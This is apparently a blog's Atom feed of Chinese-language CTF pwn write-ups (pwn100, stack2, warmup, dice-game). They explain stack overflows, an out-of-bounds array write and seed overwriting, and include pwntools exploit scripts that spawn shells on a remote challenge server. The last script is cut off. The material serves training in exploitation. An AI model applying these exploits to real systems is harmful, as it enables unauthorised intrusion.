<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>faint-star</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-08-22T03:09:38.989Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>faint-star</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pwn100</title>
    <link href="http://yoursite.com/2019/08/22/pwn100/"/>
    <id>http://yoursite.com/2019/08/22/pwn100/</id>
    <published>2019-08-22T02:40:31.000Z</published>
    <updated>2019-08-22T03:09:38.989Z</updated>
    
    <content type="html"><![CDATA[<h2 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点:"></a>溢出点:</h2><p>自己定义了一个read函数，是在原来的read上进行包装，读满200个字节才退出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">my_read</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + a1), <span class="number">1u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而read读到的内容是放在调用函数这一层<code>rbp</code>-0x40h的地方，肯定会溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40068E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  my_read((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/mnt/hgfs/linux_share/pwn/xctf/pwn100/pwn100'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>泄露<code>libc</code>版本，然后调用<code>system(&#39;/bin.sh&#39;)</code></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process('./pwn100')</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">45415</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b*0x00000000004006B6')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn100'</span>)</span><br><span class="line">start_addr =<span class="number">0x00000000004006B8</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400763</span></span><br><span class="line"></span><br><span class="line">payload1 = (<span class="number">0x48</span>*<span class="string">'a'</span>+p64(pop_rdi)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(start_addr)).ljust(<span class="number">200</span>,<span class="string">'a'</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'bye~\n'</span>)</span><br><span class="line">unpack = p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">put_addr = hex(u64(unpack))</span><br><span class="line">info(<span class="string">'puts: '</span>+ put_addr)</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="number">0x48</span>*<span class="string">'a'</span>+p64(pop_rdi)+p64(elf.got[<span class="string">'read'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(start_addr)).ljust(<span class="number">200</span>,<span class="string">'a'</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'bye~\n'</span>)</span><br><span class="line">unpack = p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">read_addr = hex(u64(unpack))</span><br><span class="line">info(<span class="string">'read: '</span>+ read_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"puts"</span>, int(put_addr,<span class="number">16</span>))</span><br><span class="line">obj.add_condition(<span class="string">'read'</span>, int(read_addr,<span class="number">16</span>))</span><br><span class="line">system = int(put_addr,<span class="number">16</span>) + obj.dump(<span class="string">"system"</span>) - obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">bin_sh = int(put_addr,<span class="number">16</span>) + obj.dump(<span class="string">"str_bin_sh"</span>) - obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">payload3 = (<span class="number">0x48</span>*<span class="string">'a'</span>+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(start_addr)).ljust(<span class="number">200</span>,<span class="string">'a'</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这个<code>LibcSearcher</code>的添加条件功能不太会用，不知道为啥加了条件出来的结果反而变多了，我就手动选了一个，竟然一次就对了- -，我选的<code>3</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Multi Results:</span><br><span class="line"> 0: archive-old-glibc (id libc6-amd64_2.24-3ubuntu1_i386)</span><br><span class="line"> 1: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2.2_i386)</span><br><span class="line"> 2: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2_i386)</span><br><span class="line"> 3: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span><br><span class="line"> 4: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span><br><span class="line"> 5: archive-old-glibc (id libc6-amd64_2.24-3ubuntu2.2_i386)</span><br><span class="line"> 6: archive-old-glibc (id libc6-i386_2.19-10ubuntu2.3_amd64)</span><br><span class="line">Please supply more info using </span><br><span class="line">    add_condition(leaked_func, leaked_address).</span><br><span class="line">You can choose it by hand</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;溢出点&quot;&gt;&lt;a href=&quot;#溢出点&quot; class=&quot;headerlink&quot; title=&quot;溢出点:&quot;&gt;&lt;/a&gt;溢出点:&lt;/h2&gt;&lt;p&gt;自己定义了一个read函数，是在原来的read上进行包装，读满200个字节才退出&lt;/p&gt;
&lt;figure class=&quot;high
      
    
    </summary>
    
    
      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
    
      <category term="overflow" scheme="http://yoursite.com/tags/overflow/"/>
    
  </entry>
  
  <entry>
    <title>stack2</title>
    <link href="http://yoursite.com/2019/08/21/stack2/"/>
    <id>http://yoursite.com/2019/08/21/stack2/</id>
    <published>2019-08-21T00:29:12.000Z</published>
    <updated>2019-08-21T01:32:02.131Z</updated>
    
    <content type="html"><![CDATA[<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑:"></a>程序逻辑:</h2><p>输入几个数，然后可以使用程序提供的4个功能进行操作，直到输入5程序才会退出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br></pre></td></tr></table></figure><h2 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点:"></a>溢出点:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br></pre></td></tr></table></figure><p>更改数的功能，下标v5的范围没有限制，会导致数组越界，我们可以利用他来向栈上更高地址的位置写入数据，将返回地址改写使他跳转到开shell的函数处执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题因为环境的问题远程服务器上没有<code>/bin/bash</code>的shell，可以用<code>sh</code>的shell，<code>/bin/sh</code>的地址是<code>0x08048980</code>，加7就是<code>sh</code>的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rodata:08048980 command         db &apos;/bin/bash&apos;,0        ; DATA XREF: hackhere+14↑o</span><br></pre></td></tr></table></figure><h2 id="栈上布局"><a href="#栈上布局" class="headerlink" title="栈上布局:"></a>栈上布局:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">low                 esp---&gt;  +-----------------+</span><br><span class="line">                             |   call system   |</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |       sh        |</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">high                         +-----------------+</span><br></pre></td></tr></table></figure><p>关于返回地址的位置，我一开始也以为是直接与<code>v13</code>相隔0x70的位置后来调试发现不对，是相差了132的地方，还是要以程序运行时的调试结果为准。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process('./stack2')</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">45441</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,"b*0x080488EE")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_addr</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 0x080485B4 call  _system</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>,<span class="string">'132\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>,<span class="string">'180\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'133\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'133\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'134\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'4\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'135\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'8\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x08048987 '/bin/sh'[7]</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'136\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'135\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'137\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'137\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'138\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'4\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'139\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'8\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">'How many numbers you have:'</span>,<span class="string">'4\n'</span>)</span><br><span class="line">p.sendafter(<span class="string">'Give me your numbers'</span>,<span class="string">'1 2 3 4\n'</span>)</span><br><span class="line">set_addr()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;程序逻辑&quot;&gt;&lt;a href=&quot;#程序逻辑&quot; class=&quot;headerlink&quot; title=&quot;程序逻辑:&quot;&gt;&lt;/a&gt;程序逻辑:&lt;/h2&gt;&lt;p&gt;输入几个数，然后可以使用程序提供的4个功能进行操作，直到输入5程序才会退出。&lt;/p&gt;
&lt;figure class=&quot;hi
      
    
    </summary>
    
    
      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>warmup</title>
    <link href="http://yoursite.com/2019/08/20/warmup/"/>
    <id>http://yoursite.com/2019/08/20/warmup/</id>
    <published>2019-08-20T15:07:30.000Z</published>
    <updated>2019-08-20T15:35:02.641Z</updated>
    
    <content type="html"><![CDATA[<h2 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点:"></a>溢出点:</h2><p><code>scanf</code>输入字符串的时候没有检查长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">__isoc99_scanf(<span class="string">"%s"</span>, v2);</span><br></pre></td></tr></table></figure><p>逻辑分析:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )</span><br><span class="line">          v14 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="string">'@'</span> )</span><br><span class="line">          v14 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check2(v2[i]) )</span><br><span class="line">          v14 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="string">'.'</span> )</span><br><span class="line">          v14 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check3(v2[i]) )</span><br><span class="line">          v14 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check3(v2[i]) )</span><br><span class="line">          v14 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check3(v2[i]) )</span><br><span class="line">          v14 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check3(v2[i]) )</span><br><span class="line">          v14 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v14 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这一大段其实就是依次检查我们输入的字符串的每一位并将v14置成对应的数，但其实这一段并没什么用</p><p>关键是这一段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*(&amp;v3 + --v14))();</span><br></pre></td></tr></table></figure><p><code>v3</code>加上<code>v14</code>减去1，将这个地址开始的指令当作函数来执行。v14初始值为1，我们简单点上面的检查都不通过，那么到这一步，地址就只取决于v3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br></pre></td></tr></table></figure><p>观察到v3的位置是在相对v2高地址的地方，我们可以通过v2的输入来覆盖v3的值</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process('./forgot')</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">42514</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'faint-star'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'A'</span>+p32(<span class="number">0x080486CC</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;溢出点&quot;&gt;&lt;a href=&quot;#溢出点&quot; class=&quot;headerlink&quot; title=&quot;溢出点:&quot;&gt;&lt;/a&gt;溢出点:&lt;/h2&gt;&lt;p&gt;&lt;code&gt;scanf&lt;/code&gt;输入字符串的时候没有检查长度&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;
      
    
    </summary>
    
    
      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
    
      <category term="overflow" scheme="http://yoursite.com/tags/overflow/"/>
    
  </entry>
  
  <entry>
    <title>dice-game</title>
    <link href="http://yoursite.com/2019/08/20/dice-game/"/>
    <id>http://yoursite.com/2019/08/20/dice-game/</id>
    <published>2019-08-20T14:11:56.000Z</published>
    <updated>2019-08-20T14:36:39.661Z</updated>
    
    <content type="html"><![CDATA[<h2 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点:"></a>溢出点:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">v6 = read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br></pre></td></tr></table></figure><p>读进来的数据刚好能覆盖到<code>rbp</code>指针之前，无法覆盖返回地址。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h2><p>程序会不停的产生随机数，猜中50次就能得到flag。当然随机是伪随机，当<code>seed</code>一定时产生的数列是一定的，这个seed也是存放在栈上，溢出点虽然无法利用来覆盖返回地址，但是可以覆盖栈上的<code>local variable</code>。</p><h2 id="产生随机数"><a href="#产生随机数" class="headerlink" title="产生随机数:"></a>产生随机数:</h2><p>产生一个长度为50的<code>seed</code>为0的伪随机序列: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">srand(seed[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">49</span>; ++i )&#123;</span><br><span class="line"><span class="keyword">int</span> r = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>,r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p=process('./dice_game')</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span 